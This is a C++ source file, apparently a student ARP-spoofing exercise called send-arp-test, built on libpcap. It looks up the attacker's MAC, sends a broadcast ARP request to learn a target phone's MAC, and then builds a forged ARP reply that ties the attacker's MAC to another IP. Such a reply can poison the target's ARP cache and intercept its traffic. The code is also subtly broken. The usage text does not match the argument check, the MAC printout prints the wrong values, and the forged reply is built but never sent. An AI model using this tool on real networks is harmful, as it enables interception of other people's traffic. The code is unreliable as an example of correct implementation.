#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "libnet.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int get_mac (char* dev, uint8_t * mac_addr){
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    if(sock < 0){
        printf("Sorry I cant Find MAC lol\n");
        return 0;
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    int ret = ioctl(sock, SIOCGIFHWADDR, &ifr);
    if (ret<0){
        printf("Sorry I cant Find MAC lol\n");
        return 0;
    }

    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);

    return 1;

}
int main(int argc, char* argv[]) {

    if (argc != 4) {
		usage();
		return -1;
	}
    // sander ip : 192.168.1.177
    // target ip : 192.168.1.105

    char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    uint8_t mac_addr[6];
    get_mac(dev, mac_addr); // find attacker mac
    Ip myIP = Ip(argv[3]);
    Ip phoneIP = Ip(argv[2]);
    for(int i=0; i<6; i++){
        printf("%02x : ", mac_addr[i]);
           if (i==5)
               printf("%02x\n", mac_addr[i]);
    }

    EthArpPacket packet; // I will find sander mac

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(mac_addr);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(mac_addr);
    packet.arp_.sip_ = htonl(myIP);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(phoneIP);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

    const u_char* arp_packet;
    struct pcap_pkthdr* arp_header;
    struct EthHdr* Ethernet;
    struct ArpHdr* Arp;
    struct Mac phoneMac;
    EthArpPacket Sender_Reply;

    while(true) {
        int res = pcap_next_ex(handle, &arp_header, &arp_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
              break;
          }
        Ethernet = (struct EthHdr *)(arp_packet);
        Arp = (struct ArpHdr *)(arp_packet + sizeof(EthHdr));
        if (ntohs(Ethernet->type_) == EthHdr::Arp && ntohs(Arp->op_) == ArpHdr::Reply && ntohl(Arp->sip_) == Ip(argv[2])){
            phoneMac = Arp->smac_;
            break;
         }
      }

      Mac asd = Mac(phoneMac);
      for(int i=0; i<6; i++){
      printf("%02x : ",asd.SIZE+i);
      }
      packet.eth_.dmac_ = Mac(phoneMac);
      packet.eth_.smac_ = Mac(mac_addr);
      packet.eth_.type_ = htons(EthHdr::Arp);

      packet.arp_.hrd_ = htons(ArpHdr::ETHER);
      packet.arp_.pro_ = htons(EthHdr::Ip4);
      packet.arp_.hln_ = Mac::SIZE;
      packet.arp_.pln_ = Ip::SIZE;
      packet.arp_.op_ = htons(ArpHdr::Reply);
      packet.arp_.smac_ = Mac(mac_addr);
      packet.arp_.sip_ = htonl(myIP);
      packet.arp_.tmac_ = Mac(phoneMac);
      packet.arp_.tip_ = htonl(phoneIP);


	pcap_close(handle);
}
